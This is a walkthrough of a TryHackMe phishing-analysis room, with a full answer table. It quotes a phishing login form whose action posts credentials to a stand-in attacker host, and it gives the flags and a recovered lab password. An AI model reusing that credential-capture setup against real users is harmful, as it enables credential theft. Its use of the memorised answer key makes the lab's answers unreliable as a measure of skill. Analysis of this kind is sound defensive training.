# TryHackMe: ParrotPost Phishing Analysis Walkthrough

## Introduction

In this room, we investigate a phishing email targeting a user named Paul. The objective is to analyze the email, identify indicators of phishing, inspect the malicious webpage, and uncover how attackers are collecting user credentials.

By the end of the room, we'll have traced the phishing infrastructure, captured a flag, and recovered credentials stored on the attacker's server.

---

## Investigating the Email

After opening the provided email, the first thing I examined was the email header. Email headers often reveal information about the actual sender, routing path, and any attempts to disguise the source of the message.

Scrolling through the headers, I located the originating IP address within the **Received** fields. To determine where the email originated, I performed an IP lookup using an online geolocation service.

The lookup revealed that the sending mail server was associated with:

**Latvia**

### Flag/Answer

```text
Latvia
```

---

## Checking the Reply-To Address

A common phishing technique is to display one sender address while directing replies to a completely different mailbox.

While reviewing the headers, I located the **Reply-To** field:

```text
Reply-To: no-reply@postparr0t.thm
```

This means that if Paul replies to the message, his response will not necessarily go to the address shown in the From field. Instead, it will be delivered to:

### Flag/Answer

```text
no-reply@postparr0t.thm
```

---

## Finding the Hidden Custom Header

Continuing through the email headers, I searched for anything unusual. Attackers and CTF creators frequently hide information inside custom headers.

Among the header entries, I discovered a custom value containing the first flag:

### Flag/Answer

```text
THM{y0u_f0und_7h3_h34d3r}
```

---

## Analyzing the HTML Email

Next, I examined the HTML source of the phishing page.

Inside the source code, the text displayed in the page header was encoded using HTML entities. Instead of readable text, it appeared as a series of character codes.

To decode the content, I copied the encoded string into CyberChef and used the **From HTML Entity** operation.

After decoding, the content inside the `<h1>` tag became:

### Flag/Answer

```text
ParrotPost Secure Webmail Login
```

---

## Reviewing the CSS

The stylesheet was heavily compressed and difficult to read because it had been minified.

To make analysis easier, I beautified the CSS using a formatter. This process is commonly known as:

### Flag/Answer

```text
CSS Beautify
```

---

## Discovering Where Credentials Are Sent

The next step was to inspect the login form itself.

Within the HTML source, I located the form element and examined its action parameter.

The form submission was configured to send credentials directly to:

```html
<form action="http://evilparrot.thm:8080/cred-capture.php">
```

This reveals the endpoint responsible for collecting stolen usernames and passwords.

### Flag/Answer

```text
http://evilparrot.thm:8080/cred-capture.php
```

---

## Investigating JavaScript Redirection

While reviewing the page scripts, I noticed JavaScript responsible for redirecting users after interaction with the page.

The script used the following property:

```javascript
window.location.href
```

This property allows a webpage to redirect visitors to another URL.

### Flag/Answer

```text
window.location.href
```

---

## Testing the Credential Capture Page

To understand how the phishing infrastructure worked, I submitted fake credentials through the login form.

After submitting the form, the server responded with a flag confirming that the credentials had been captured successfully.

### Flag/Answer

```text
THM{c4p7ur3d_y0ur_cr3d5}
```

---

## Finding the Stolen Credentials

Since the phishing page was collecting usernames and passwords, I wanted to determine where the captured data was stored.

Further investigation revealed a publicly accessible log file located at:

### Flag/Answer

```text
/creds.txt
```

Opening the file displayed multiple credential entries collected by the phishing site.

---

## Recovering Chris Smith's Password

Inside the credential log, I searched for the entry belonging to Chris Smith.

The log contained the following password:

### Flag/Answer

```text
FlyL1ke!A~Bird
```

---

## Conclusion

This room provides an excellent introduction to phishing analysis and demonstrates how attackers use fraudulent login pages to harvest credentials.

During the investigation, we:

* Analyzed email headers
* Identified the sender's origin
* Inspected Reply-To manipulation
* Decoded HTML entities
* Beautified CSS code
* Examined form submission endpoints
* Analyzed JavaScript redirects
* Submitted test credentials
* Retrieved captured credentials from the attacker's server

### Answers Summary

| Question                  | Answer                                                    |
| ------------------------- | --------------------------------------------------------- |
| Country                   | Latvia                                                    |
| Reply-To Address          | [no-reply@postparr0t.thm](mailto:no-reply@postparr0t.thm) |
| Custom Header             | THM{y0u_f0und_7h3_h34d3r}                                 |
| H1 Text                   | ParrotPost Secure Webmail Login                           |
| Reverse of CSS Minify     | CSS Beautify                                              |
| Login Endpoint            | http://evilparrot.thm:8080/cred-capture.php               |
| Redirect Property         | window.location.href                                      |
| Captured Credentials Flag | THM{c4p7ur3d_y0ur_cr3d5}                                  |
| Credentials Log           | /creds.txt                                                |
| Chris Smith Password      | FlyL1ke!A~Bird                                            |
